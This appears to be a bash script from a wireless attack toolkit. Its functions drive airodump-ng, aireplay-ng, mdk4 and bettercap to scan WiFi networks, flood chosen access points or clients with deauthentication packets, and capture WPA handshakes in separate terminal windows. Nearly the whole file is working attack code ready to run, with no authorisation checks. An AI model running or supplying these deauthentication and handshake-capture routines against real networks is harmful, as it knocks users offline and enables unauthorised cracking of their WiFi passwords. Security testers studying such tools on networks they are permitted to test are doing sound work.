#!/bin/bash

open_terminal() {
    local title="$1" cmd="$2"
    if   command -v xterm         &>/dev/null; then
        xterm -bg black -fg cyan -title "$title" -e "bash -c '$cmd; echo Press\ Enter\ to\ close; read'" &
		track_term_pid "$!" "$title"
#		setsid xterm -bg black -fg cyan -title "$title" -e "bash -c '$cmd; echo Press\ Enter\ to\ close; read'" </dev/null &>/dev/null &
#       disown
#		setsid puts the xterm in a brand new session with its own process group, so a terminal-driver SIGINT aimed at your script's foreground group physically can't reach it. disown removes it from bash's job table so it also survives if the script itself exits or gets SIGHUP'd.
    elif command -v gnome-terminal &>/dev/null; then
        gnome-terminal --title="$title" -- bash -c "$cmd; echo 'Press Enter to close'; read" &
		track_term_pid "$!" "$title"
    elif command -v xfce4-terminal &>/dev/null; then
        xfce4-terminal --title="$title" -e "bash -c '$cmd; echo Press\ Enter\ to\ close; read'" &
		track_term_pid "$!" "$title"
    elif command -v konsole        &>/dev/null; then
        konsole --title "$title" -- bash -c "$cmd; echo 'Press Enter to close'; read" &
		track_term_pid "$!" "$title"
    else
        err "No terminal emulator found — install xterm"; return 1
    fi
}

track_term_pid() {
    local pid="$1" title="$2"
    echo "$pid $title" >> "$TERM_PIDFILE"
    ( while kill -0 "$pid" 2>/dev/null; do sleep 2; done
      sed -i "/^$pid /d" "$TERM_PIDFILE" ) &
    disown
}

check_stale_terminals() {
    [[ -f "$TERM_PIDFILE" ]] || { echo "No terminal PID log found."; return; }

    local pid title reply line
    local -a remaining=()
    local -a lines=()
    mapfile -t lines < "$TERM_PIDFILE"

    for line in "${lines[@]}"; do
        [[ -z "$line" ]] && continue
        pid="${line%% *}"
        title="${line#* }"

        if ! kill -0 "$pid" 2>/dev/null; then
            continue   # already dead — drop silently
        fi

        read -rp "PID $pid ('$title') is still running. Kill it? [y/N] " reply
        if [[ "$reply" =~ ^[Yy]$ ]]; then
            kill "$pid" 2>/dev/null
            sleep 0.3
            if kill -0 "$pid" 2>/dev/null; then
                kill -9 "$pid" 2>/dev/null \
                    && echo "SIGTERM ignored — force-killed $pid." \
                    || { echo "Failed to kill $pid (check permissions)."; remaining+=("$pid $title"); }
            else
                echo "Killed $pid."
            fi
        else
            remaining+=("$pid $title")
        fi
    done

    : > "$TERM_PIDFILE"
    for entry in "${remaining[@]}"; do
        echo "$entry" >> "$TERM_PIDFILE"
    done

    [[ ${#remaining[@]} -eq 0 ]] && echo "No leftover terminals running."
}

asktime () {
	while true; do
	info "Scan timing would be better if above 30sec"
	read -rp "$(printf "%s Scanning & Deauth Time... %s\t" "${BLUE_DIM}" "${NC}")" sec	
    if [[ -z $sec || $sec -ge 180  || ! $sec =~ ^[0-9]+$ || $sec -le 20 ]]; then
		warn "Scan time must be a number greater than 20 and less then 180 sec"
		enter
	else 
        break
    fi
    done
}

scan_airodump() {
	while true; do
	info "Scan timing would be better if above 30sec"
	read -rp "$(printf "%s Scanning Time... %s\t" "${BLUE_DIM}" "${NC}")" sec	
    if [[ -z $sec || $sec -ge 60  || ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
		warn "Scan time must be a number greater than 0 and less then 60 sec"
		enter
	else 
        break
    fi
    done
	warn "Press Ctrl+C here to stop scan"
	log_event "SCAN" "Airodump scan started on $INTERFACE for ${sec}s"

    local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script" <<EOF
#!/bin/bash
timeout $sec airodump-ng $INTERFACE --write scan --output-format csv &

echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script"
    open_terminal "Scan" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid 2>/dev/null)
	if [[ -z $readdata ]]; then
    	err "Scan Failed"
		log_event "ERROR" "Airodump scan failed to start"
    	return 1
	fi

	trap 'info "Interuptted"; break' INT

	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    kill -0 "$readdata" 2>/dev/null || { err "Windows Closed early"; break; }
    	sleep 2
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	rm -f "$script" "$pid"
	log_event "SCAN" "Airodump scan completed on $INTERFACE"
}

scan_handshake() {
	
	log_event "HANDSHAKE" "Handshake capture started for AP: $ap on channel $ch"
	asktime
	warn "Pressing Ctrl+C or stopping capture will return in failure"

    local script1
    script1="/tmp/term_$$_${RANDOM}.sh"
	local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid1
    pid1="/tmp/term_$$_${RANDOM}.pid"
	local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script1" <<EOF
#!/bin/bash
	timeout $sec airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE &
echo \$! > "$pid1"
wait
rm -f $pid1
EOF

	cat > "$script" <<EOF
#!/bin/bash
	timeout $(( sec - 10 )) aireplay-ng --deauth 0 -a $ap $INTERFACE --ignore-negative-one &
echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script1" "$script"
    open_terminal "Capturing" "bash $script1"
	open_terminal "Deauth" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid1 2>/dev/null)
	if [[ -z $readdata ]]; then
	    err "Capturing Failed"
		log_event "ERROR" "Handshake capture failed to start on $ap"
	    return 1
	fi
	local readata
	readata=$(cat $pid 2>/dev/null)
	if [[ -z $readata ]]; then
	    err "Deauth Failed"
		log_event "ERROR" "Deauth failed to start against $ap"
	    return 1
	fi

	trap 'info "Interuptted"; break' INT
	
	secs=$(( sec - 10 ))
	local times=$(( SECONDS + secs ))
	while (( SECONDS < times )); do
    	# deauth ending on its own isn't fatal — capture might still get the handshake
	    if ! kill -0 "$readata" 2>/dev/null; then
        	info "Deauth Finished (capture still running)"
			log_event "DEAUTH" "Aireplay deauth completed for $ap"
        	break
    	fi
	done
	
	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    if ! kill -0 "$readdata" 2>/dev/null; then
        	info "Capture terminal closed"
			log_event "CAPTURE" "Handshake capture ended for $ap"
        	break
    	fi
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	sudo pkill -P "$readata" 2>/dev/null
	sudo kill "$readata" 2>/dev/null
	rm -f "$script1" "$script" "$pid1" "$pid"
	log_event "HANDSHAKE" "Handshake capture completed for AP: $ap"
}

scan_handshake1() {
	log_event "HANDSHAKE" "Handshake capture (client-targeted) started for AP: $ap, Client: $cp"
	asktime
	warn "Pressing Ctrl+C or stopping capture will return in failure"

    local script1
    script1="/tmp/term_$$_${RANDOM}.sh"
	local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid1
    pid1="/tmp/term_$$_${RANDOM}.pid"
	local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script1" <<EOF
#!/bin/bash
	timeout $sec airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE &
echo \$! > "$pid1"
wait
rm -f $pid1
EOF

	cat > "$script" <<EOF
#!/bin/bash
	timeout $(( sec - 10 )) aireplay-ng --deauth 0 -a $ap -c $cp $INTERFACE --ignore-negative-one &
echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script1" "$script"
    open_terminal "Capturing" "bash $script1"
	open_terminal "Deauth" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid1 2>/dev/null)
	if [[ -z $readdata ]]; then
	    err "Capturing Failed"
		log_event "ERROR" "Capture failed to start against $ap"
	    return 1
	fi
	local readata
	readata=$(cat $pid 2>/dev/null)
	if [[ -z $readata ]]; then
	    err "Deauth Failed"
		log_event "ERROR" "Deauth failed to start against $ap"
	    return 1
	fi

	trap 'info "Interuptted"; break' INT
	
	secs=$(( sec - 10 ))
	local times=$(( SECONDS + secs ))
	while (( SECONDS < times )); do
    	# deauth ending on its own isn't fatal — capture might still get the handshake
	    if ! kill -0 "$readata" 2>/dev/null; then
        	info "Deauth Finished (capture still running)"
			log_event "DEAUTH" "Aireplay client-targeted deauth completed for $ap -> $cp"
        	break
    	fi
	done
	
	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    if ! kill -0 "$readdata" 2>/dev/null; then
        	info "Capture terminal closed"
			log_event "CAPTURE" "Client-targeted capture ended for $ap"
        	break
    	fi
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	sudo pkill -P "$readata" 2>/dev/null
	sudo kill "$readata" 2>/dev/null
	rm -f "$script1" "$script" "$pid1" "$pid"
	log_event "HANDSHAKE" "Client-targeted handshake capture completed for AP: $ap, Client: $cp"
}

validate_digit () {
	local value=$1
	if [[ ! $value =~ ^[0-9]+$ ]]; then
		err "Enter a valid number"
		return 1
	fi
	return 0
}

mdk4_handshake() {
	log_event "HANDSHAKE" "MDK4 handshake started for AP: $ap on channel $ch"
	info "Sometime MDK4 deauth starts late so give atleast 30+ sec."
	asktime
	warn "Pressing Ctrl+C or stopping capture will return in failure"

    local script1
    script1="/tmp/term_$$_${RANDOM}.sh"
	local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid1
    pid1="/tmp/term_$$_${RANDOM}.pid"
	local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script1" <<EOF
#!/bin/bash
	timeout $sec airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE &
echo \$! > "$pid1"
wait
rm -f $pid1
EOF

	cat > "$script" <<EOF
#!/bin/bash
	timeout $(( sec - 10 )) mdk4 $INTERFACE d -B $ap -c $ch &
echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script1" "$script"
    open_terminal "Capturing" "bash $script1"
	open_terminal "Deauth" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid1 2>/dev/null)
	if [[ -z $readdata ]]; then
	    err "Capturing Failed"
		log_event "ERROR" "Capture failed to start against $ap"
	    return 1
	fi
	local readata
	readata=$(cat $pid 2>/dev/null)
	if [[ -z $readata ]]; then
	    err "Deauth Failed"
		log_event "ERROR" "MDK4 deauth failed to start against $ap"
	    return 1
	fi

	trap 'info "Interuptted"; break' INT
	
	secs=$(( sec - 10 ))
	local times=$(( SECONDS + secs ))
	while (( SECONDS < times )); do
    	# deauth ending on its own isn't fatal — capture might still get the handshake
	    if ! kill -0 "$readata" 2>/dev/null; then
        	info "Deauth Finished (capture still running)"
			log_event "DEAUTH" "MDK4 deauth completed for $ap"
        	break
    	fi
	done
	
	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    if ! kill -0 "$readdata" 2>/dev/null; then
        	info "Capture terminal closed"
			log_event "CAPTURE" "MDK4 handshake capture ended for $ap"
        	break
    	fi
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	sudo pkill -P "$readata" 2>/dev/null
	sudo kill "$readata" 2>/dev/null
	rm -f "$script1" "$script" "$pid1" "$pid"
	log_event "HANDSHAKE" "MDK4 handshake completed for AP: $ap"
}

aireplay_deauth() {
	log_event "DEAUTH" "Aireplay-ng deauth started against $ap"
	log_event "DEAUTH" "Aireplay-ng deauth started with $pac packets"

	warn "Press Ctrl+C here to stop Deauth"

    local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script" <<EOF
#!/bin/bash
	if [[ -z "$cp" ]]; then
		aireplay-ng --deauth $pac -a $ap $INTERFACE --ignore-negative-one &
	else
		aireplay-ng --deauth $pac -a $ap -c $cp $INTERFACE --ignore-negative-one &
	fi
echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script"
    open_terminal "Deauth" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid 2>/dev/null)
	if [[ -z $readdata ]]; then
    	err "Deauth Failed"
		log_event "ERROR" "Deauth failed to start against $ap"
    	return 1
	fi

	trap 'info "Interuptted"; break' INT

	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    kill -0 "$readdata" 2>/dev/null || { err "Windows Closed early"; break; }
    	sleep 2
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	rm -f "$script" "$pid"
	log_event "DEAUTH" "Aireplay-ng deauth completed for $ap"
}

mdk4_deauth() {
	log_event "DEAUTH" "MDK4 deauth started against $ap"
	
	while true; do
	read -rp "$(printf "%sDeauth Time... %s\t" "${BLUE_DIM}" "${NC}")" sec	
    if [[ -z $sec || ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
		warn "Scan time must be a number greater than 0"
		enter
	else 
        break
    fi
    done
	warn "Press Ctrl+C here to stop Deauth"
	log_event "DEAUTH" "MDK4 deauth started against $ap for ${sec}s"

    local script
    script="/tmp/term_$$_${RANDOM}.sh"
    local pid
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script" <<EOF
#!/bin/bash
	timeout $sec mdk4 $INTERFACE d -B $ap -c $ch &

echo \$! > "$pid"
wait
rm -f $pid
EOF

chmod +x "$script"
    open_terminal "Deauth" "bash $script"
    sleep 2

	local readdata
	readdata=$(cat $pid 2>/dev/null)
	if [[ -z $readdata ]]; then
    	err "Deauth Failed"
		log_event "ERROR" "MDK4 deauth failed to start against $ap"
    	return 1
	fi

	trap 'info "Interuptted"; break' INT

	local time=$(( SECONDS + sec ))
	while (( SECONDS < time )); do
	    kill -0 "$readdata" 2>/dev/null || { err "Windows Closed early"; break; }
    	sleep 2
	done

	trap '' INT

	sudo pkill -P "$readdata" 2>/dev/null
	sudo kill "$readdata" 2>/dev/null
	rm -f "$script" "$pid"
	log_event "DEAUTH" "MDK4 deauth completed for $ap"
}

live_airodump() {

if [[ -f /tmp/live_num.flag ]]; then
	local lp
	lp=$(cat /tmp/live_num.flag 2>/dev/null)
	if [[ -n "$lp" ]] && kill -0 "$lp" 2>/dev/null; then
		err "Live monitor is currently running (PID $lp) — stop it before running an attack"
		log_event "WARNING" "Attack blocked — live airodump monitor active"
		enter
		return 1
	fi
fi

    while true; do
	info "Scan timing....."
	read -rp "$(printf "%s Scanning Time(must be above 10sec)... %s\t" "${BLUE_DIM}" "${NC}")" sec  
	if [[ -z $sec || $sec -le 10  || ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
		warn "Scan time must be a number greater than 10"
		enter
	else 
		break
	fi
    done
    warn "Script will not be blocked so please dont use anything which requires card usages"
    enter 

    local script
    script="/tmp/term_$$_${RANDOM}.sh"
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script" <<EOF
#!/bin/bash
timeout $sec airodump-ng --bssid $ap -c $ch $INTERFACE &

echo \$! > "$pid"
EOF

    chmod +x "$script"
    open_terminal "LIVE" "bash $script"
    sleep 3

    local readdata
    readdata=$(cat "$pid" 2>/dev/null)
    if [[ -z $readdata ]]; then
	err "Live Failed"
	log_event "ERROR" "Airodump live scan failed to start"
	return 1
    fi

    echo "$readdata" > /tmp/live_num.flag
    log_event "SCAN" "Airodump live scan started on $INTERFACE for ${sec}s"

    (
	while kill -0 "$readdata" 2>/dev/null; do sleep 2; done
	rm -f /tmp/live_num.flag "$script" "$pid"
	log_event "SCAN" "Airodump live scan completed on $INTERFACE"
    ) &
    disown
}


live_bettercap() {

if [[ -f /tmp/live_num.flag ]]; then
	local lp
	lp=$(cat /tmp/live_num.flag 2>/dev/null)
	if [[ -n "$lp" ]] && kill -0 "$lp" 2>/dev/null; then
		err "Live monitor is currently running (PID $lp) — stop it before running an attack"
		log_event "WARNING" "Attack blocked — live airodump monitor active"
		enter
		return 1
	fi
fi
    while true; do
	info "Scan timing....."
	read -rp "$(printf "%s Scanning Time(must be above 10sec)... %s\t" "${BLUE_DIM}" "${NC}")" sec  
	if [[ -z $sec || $sec -le 10  || ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
		warn "Scan time must be a number greater than 10"
		enter
	else 
		break
	fi
    done
    warn "Script will not be blocked so please dont use anything which requires card usages"
    enter 

    local script
    script="/tmp/term_$$_${RANDOM}.sh"
    pid="/tmp/term_$$_${RANDOM}.pid"

    cat > "$script" <<EOF
#!/bin/bash
timeout $sec bettercap -iface "$INTER" -eval "wifi.recon.channel $ch; wifi.recon on; sleep 5; set wifi.show.filter $ap; set ticker.commands 'wifi.show'; set ticker.period 5; ticker on" &


echo \$! > "$pid"
EOF

    chmod +x "$script"
    open_terminal "LIVE" "bash $script"
    sleep 3

    local readdata
    readdata=$(cat "$pid" 2>/dev/null)
    if [[ -z $readdata ]]; then
	err "Live Failed"
	log_event "ERROR" "Bettercap live scan failed to start"
	return 1
    fi

    echo "$readdata" > /tmp/live_num.flag
    log_event "SCAN" "Bettercap live scan started on $INTER for ${sec}s"

    (
	while kill -0 "$readdata" 2>/dev/null; do sleep 2; done
	rm -f /tmp/live_num.flag "$script" "$pid"
	log_event "SCAN" "Bettercap live scan completed on $INTER"
    ) &
    disown
}
